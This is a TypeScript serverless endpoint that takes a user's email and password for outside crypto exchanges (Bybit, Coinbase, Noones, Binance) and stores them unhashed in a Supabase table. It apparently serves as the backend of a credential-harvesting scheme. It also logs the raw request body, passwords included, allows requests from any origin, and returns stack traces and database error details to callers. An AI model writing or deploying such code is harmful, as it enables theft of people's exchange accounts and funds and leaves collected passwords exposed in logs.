import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

console.log('Environment check:', {
  hasSupabaseUrl: !!supabaseUrl,
  hasServiceRoleKey: !!supabaseServiceRoleKey,
  supabaseUrlPrefix: supabaseUrl ? supabaseUrl.substring(0, 20) + '...' : null,
});

if (!supabaseUrl || !supabaseServiceRoleKey) {
  console.error('Missing environment variables:', {
    SUPABASE_URL: !!process.env.SUPABASE_URL,
    VITE_SUPABASE_URL: !!process.env.VITE_SUPABASE_URL,
    SUPABASE_SERVICE_ROLE_KEY: !!process.env.SUPABASE_SERVICE_ROLE_KEY,
  });
  throw new Error('SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are required in server environment variables.');
}

const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey, {
  auth: {
    persistSession: false,
  },
});

const allowedPlatforms = ['Bybit', 'Coinbase', 'Noones', 'Binance'];

function sanitizeString(value: unknown) {
  return typeof value === 'string' ? value.trim() : '';
}

export default async function handler(req: any, res: any) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  console.log('Request received:', {
    method: req.method,
    url: req.url,
    headers: req.headers,
    body: req.body,
  });

  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method not allowed' });
  }

  let payload: any;
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
  } catch (error) {
    console.error('JSON parse error:', error);
    return res.status(400).json({ error: 'Invalid JSON payload.' });
  }

  console.log('Parsed payload:', payload);

  const platform = sanitizeString(payload.platform);
  const email = sanitizeString(payload.email).toLowerCase();
  const third_party_password = sanitizeString(payload.third_party_password) || null;
  const user_id = sanitizeString(payload.user_id) || null;

  console.log('Sanitized inputs:', {
    platform,
    email: email ? '[REDACTED]' : null,
    hasPassword: !!third_party_password,
    user_id,
  });

  if (!platform || !allowedPlatforms.includes(platform)) {
    return res.status(400).json({ error: `Platform is required and must be one of: ${allowedPlatforms.join(', ')}` });
  }

  if (!email) {
    return res.status(400).json({ error: 'Email or phone is required.' });
  }

  if (platform === 'Noones' && !third_party_password) {
    return res.status(400).json({ error: 'Password is required for Noones submissions.' });
  }

  const insertPayload: Record<string, unknown> = {
    platform,
    email,
    user_id,
  };

  if (third_party_password !== null) {
    insertPayload.third_party_password = third_party_password;
  }

  console.log('Insert payload:', {
    ...insertPayload,
    email: insertPayload.email ? '[REDACTED]' : null,
    third_party_password: insertPayload.third_party_password ? '[REDACTED]' : null,
  });

  try {
    const { data, error } = await supabaseAdmin
      .from('platform_connections')
      .insert(insertPayload)
      .select();

    console.log('Supabase response:', {
      hasData: !!data,
      error: error ? {
        message: error.message,
        details: error.details,
        hint: error.hint,
        code: error.code,
      } : null,
    });

    if (error) {
      console.error('Supabase insert error:', error);
      return res.status(500).json({
        error: `Database insert failed: ${error.message}`,
        details: {
          code: error.code,
          details: error.details,
          hint: error.hint,
        }
      });
    }

    console.log('Insert successful, data:', data);
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Submission handler error:', error);
    return res.status(500).json({
      error: `Server error: ${error instanceof Error ? error.message : 'Unknown error'}`,
      stack: error instanceof Error ? error.stack : null,
    });
  }
}
